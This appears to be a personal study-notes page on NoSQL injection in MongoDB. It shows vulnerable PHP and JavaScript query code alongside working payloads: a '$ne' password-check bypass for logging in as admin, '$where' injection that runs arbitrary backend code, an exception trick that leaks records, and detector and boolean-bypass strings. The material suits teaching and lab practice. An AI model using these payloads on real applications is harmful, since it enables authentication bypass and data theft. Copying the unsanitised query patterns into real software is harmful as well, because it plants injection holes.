# NoSQL Injection (NoSQLi)

[![nosql_injection](../../../../_badges/ps-course/nosql_injection.svg)](https://portswigger.net/web-security/nosql-injection)

<div class="row row-cols-lg-2"><div>

According to a company or an application needs, a NoSQL database may be used instead of the traditional SQL database. This is often the case when using [GraphQL](/programming-languages/others/apis/graphql/index.md) API Model.

While NoSQL database such as MongoDB are inherently more resilient to common attacks, they may still be exploited.

</div><div>

</div></div>

<hr class="sep-both">

## NoSQL Parameter injection ‚úçÔ∏è

[![nosql_injection](../../../../_badges/ps-course/nosql_injection.svg)](https://portswigger.net/web-security/nosql-injection)
[![nosql_injection_authentication](../../../../_badges/rootme/web_server/nosql_injection_authentication.svg)](https://www.root-me.org/en/Challenges/Web-Server/NoSQL-injection-Authentication)

<div class="row row-cols-lg-2"><div>

The MongoDB PHP code to list all users matching a username is:

```php!
$result = $db_accounts->find(['username' => $username, 'password' => $password]);
```

If the type of `$password` is not verified, then we can try to coerce it into an array. If the input format is not JSON, try [HTTP parameter pollution](/cybersecurity/red-team/s2.discovery/techniques/websites/logic_flaws.md#http-parameter-pollution).

```php!
// bypass the password check
// ne=not equals
$result = $db_accounts->find([
    'username' => 'admin', 
    'password' => ['$ne' => '']
]);
```
</div><div>

We can use multiple operators such as:

* `['$in' => ['a', 'b']]`: keep values in array
* `['$nin' => ['a', 'b']]`: do not keep values in array
* `['$regex' => 'adm']`: keep values matching a regex (`admin`, etc.)
* `['$where' => '...']`: refer to [NoSQLi Query Injection](#nosql-query-injection-)

Some systems such as MongoDB offer what we call a projection. It indirectly prevents us from accessing unselected parameters.

```php!
// ... But only returns the property 'username' 
$results = $db_accounts->find(..., ['projection' => ['username' => 1]]);
```
</div></div>

<hr class="sep-both">

## NoSQL Query injection üìö

<div class="row row-cols-lg-2"><div>

NoSQL Query Injection occurs when the developer either passed the whole user input to the MongoDB function -or- the developer used user-input in the `$where` clause without any security mechanisms.

```!
const user_input = {'username': 'admin'}
const results = await collection.find(user_input).toArray();
```

```js!
const user_input = 'admin'
const results = await collection.find({
    $where: `this.username == "${user_input}"`
}).toArray();
```

```php!
// It's not limited to JavaScript, but the syntax changes
$username = 'admin';
$results = $db_accounts->find([
    '$where' => "this['username'] == '$username'"
]);
```

When we control the whole first parameter, we can inject a `$where`:

```!
const user_input = {'username': 'admin', '$where': '...'}
```
</div><div>

Inside the `$where`, we can write arbitrary code in the language of the backend that will be evaluated. If errors are shown, use exceptions:

```js!
{ ..., '$where': 'throw JSON.stringify(this)' }
```
</div></div>

<hr class="sep-both">

## üëª To-do üëª

Stuff that I found, but never read/used yet.

<div class="row row-cols-lg-2"><div>

* `$nin` for "NOT IN" array
* `$regex` for a condition based on a regex
* <code>'\"`{\r;$Foo}\n$Foo \\xYZ\u0000</code> PortSwigger detector
* `&& 1 &&`, `'||'1'=='1`
</div><div>
</div></div>